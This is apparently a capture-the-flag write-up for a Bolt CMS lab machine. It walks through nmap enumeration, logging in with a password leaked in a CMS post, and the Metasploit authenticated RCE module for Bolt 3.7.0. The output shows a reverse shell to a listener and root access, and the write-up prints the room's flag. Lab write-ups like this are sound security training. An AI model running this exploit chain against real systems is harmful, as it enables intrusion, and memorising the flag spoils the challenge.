Ran a basic nmap scan to enumerate open ports and services:
```console
nmap -A -sV -p- 10.10.37.221 --min-rate 5000 -oN nmap.txt
```

```console
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-25 21:09 +08
Warning: 10.10.37.221 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.37.221
Host is up (0.18s latency).
Not shown: 62287 closed tcp ports (conn-refused), 3245 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 (RSA)
|   256 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff (ECDSA)
|_  256 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8000/tcp open  http    (PHP 7.2.32-1)
|_http-generator: Bolt
|_http-title: Bolt | A hero is unleashed
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Date: Thu, 25 Jan 2024 13:09:53 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: private, must-revalidate
|     Date: Thu, 25 Jan 2024 13:09:53 GMT
|     Content-Type: text/html; charset=UTF-8
|     pragma: no-cache
|     expires: -1
|     X-Debug-Token: 195d06
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     </head>
|     <body>
|     href="#main-content" class="vis
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Thu, 25 Jan 2024 13:09:53 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: public, s-maxage=600
|     Date: Thu, 25 Jan 2024 13:09:53 GMT
|     Content-Type: text/html; charset=UTF-8
|     X-Debug-Token: 091198
|     <!doctype html>
|     <html lang="en-GB">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     <link rel="canonical" href="http://0.0.0.0:8000/">
|     </head>
|_    <body class="front">
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.94%I=7%D=1/25%Time=65B25DA1%P=aarch64-unknown-linux-gn
SF:u%r(GetRequest,29E1,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Thu,\x2025\x20J
SF:an\x202024\x2013:09:53\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\
SF:x20PHP/7\.2\.32-1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:
SF:\x20public,\x20s-maxage=600\r\nDate:\x20Thu,\x2025\x20Jan\x202024\x2013
SF::09:53\x20GMT\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nX-Debu
SF:g-Token:\x20091198\r\n\r\n<!doctype\x20html>\n<html\x20lang=\"en-GB\">\
SF:n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20chars
SF:et=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\"viewport
SF:\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Bolt\x20\
SF:|\x20A\x20hero\x20is\x20unleashed</title>\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20<link\x20href=\"https://fonts\.googleapis\.com/css\?family=Bitter\|
SF:Roboto:400,400i,700\"\x20rel=\"stylesheet\">\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/theme/base-2018/css/bulma
SF:\.css\?8ca0842ebb\">\n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\"st
SF:ylesheet\"\x20href=\"/theme/base-2018/css/theme\.css\?6cb66bfe9f\">\n\x
SF:20\x20\x20\x20\t<meta\x20name=\"generator\"\x20content=\"Bolt\">\n\x20\
SF:x20\x20\x20\t<link\x20rel=\"canonical\"\x20href=\"http://0\.0\.0\.0:800
SF:0/\">\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body\x20class=\"front\
SF:">\n\x20\x20\x20\x20\x20\x20\x20\x20<a\x20")%r(FourOhFourRequest,16C3,"
SF:HTTP/1\.0\x20404\x20Not\x20Found\r\nDate:\x20Thu,\x2025\x20Jan\x202024\
SF:x2013:09:53\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP/7\.2
SF:\.32-1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20private
SF:,\x20must-revalidate\r\nDate:\x20Thu,\x2025\x20Jan\x202024\x2013:09:53\
SF:x20GMT\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\npragma:\x20no
SF:-cache\r\nexpires:\x20-1\r\nX-Debug-Token:\x20195d06\r\n\r\n<!doctype\x
SF:20html>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20i
SF:nitial-scale=1\.0\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20<title>Bolt\x20\|\x20A\x20hero\x20is\x20unleashed</title
SF:>\n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20href=\"https://fonts\.googl
SF:eapis\.com/css\?family=Bitter\|Roboto:400,400i,700\"\x20rel=\"styleshee
SF:t\">\n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20hr
SF:ef=\"/theme/base-2018/css/bulma\.css\?8ca0842ebb\">\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/theme/base-2018/cs
SF:s/theme\.css\?6cb66bfe9f\">\n\x20\x20\x20\x20\t<meta\x20name=\"generato
SF:r\"\x20content=\"Bolt\">\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<bod
SF:y>\n\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"#main-content\"\x20cla
SF:ss=\"vis");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.09 seconds
```

After checking out the web services, we see that port 8000 runs a Content Management System(CMS).
Looking through the CMS, we see the following post on the website:

```website
Hello Everyone,

Welcome to this site, myself Jake and my username is bolt .I am still new to this CMS so it can take awhile for me to get used to this CMS but believe me i have some great content coming up for you all!

Regards,

Jake (Admin)
```

We can also find the password of the user `bolt`:
```website
Hey guys,

i suppose this is our secret forum right? I posted my first message for our readers today but there seems to be a lot of freespace out there. Please check it out! my password is boltadmin123 just incase you need it!

Regards,

Jake (Admin)
```

Tried logging in via `SSH` but it didn't seem to work. I went to the official documentation of the `Bolt` CMS to check for clues, and it mentioned that we can log in to the CMS with the `<domain name>/bolt`, so that's what I did. 

Successfully authenticating and accessing the dashboard, we see the version of the CMS used: 
![bolt version no](images/bolt%20version%20no.png)
To find the exploit ID of the previous , we can search the `bolt 3.7.0` on *ExploitDB*.

![500](images/bolt%20edb%20id.png)
Ran a search on `metasploit` to check for the exploit: 
```
msf6 > search bolt

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/webapp/bolt_authenticated_rce  2020-05-07       great      Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution
   1  exploit/multi/http/bolt_file_upload         2015-08-17       excellent  Yes    CMS Bolt File Upload Vulnerability


Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/http/bolt_file_upload

msf6 > 
```

Ran the path with `use 0` and set the respective options as required.
```console
[*] Started reverse TCP handler on 10.8.9.39:4444   
[*] Running automatic check ("set AutoCheck false" to disable)  
[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "lexcs".  
[*] Found 2 potential token(s) for creating .php files.  
[+] Deleted file rtdorukn.php.  
[+] Used token a0f0f6b7ec88f4ee65224ad5cc to create lctsyueboic.php.  
[*] Attempting to execute the payload via "/files/lctsyueboic.php?lexcs=`payload`"  
[!] No response, may have executed a blocking payload!  
[*] Command shell session 1 opened (10.8.9.39:4444 -> 10.10.123.191:55208) at 2022-08-17 21:40:38 +0530  
[+] Deleted file lctsyueboic.php.  
[+] Reverted user profile back to original state.

shell  
[*] Trying to find binary 'python' on the target machine  
[-] python not found  
[*] Trying to find binary 'python3' on the target machine  
[*] Found python3 at /usr/bin/python3  
[*] Using `python` to pop up an interactive shell  
[*] Trying to find binary 'bash' on the target machine  
[*] Found bash at /bin/bash

root@bolt:~/public/files#

```
A key point is to type in 'shell' to initiate a shell. 
Now that's left to do is to navigate the directories to find the flag!

```console
root@bolt:~/public/files# whoami  
whoami  
root  
root@bolt:~/public/files# cd /home  
cd /home  
root@bolt:/home# ls -al  
ls -al  
total 288  
drwxr-xr-x 3 root root 4096 Jul 18 2020 .  
drwxr-xr-x 27 root root 4096 Jul 18 2020 ..  
drwxr-xr-x 10 bolt bolt 4096 Jul 18 2020 bolt  
-rw-r--r-- 1 root root 277509 Jul 18 2020 composer-setup.php  
-rw-r--r-- 1 root root 34 Jul 18 2020 flag.txt  
root@bolt:/home# cat flag.txt  
cat flag.txt  
THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}  
root@bolt:/home#
```

Done!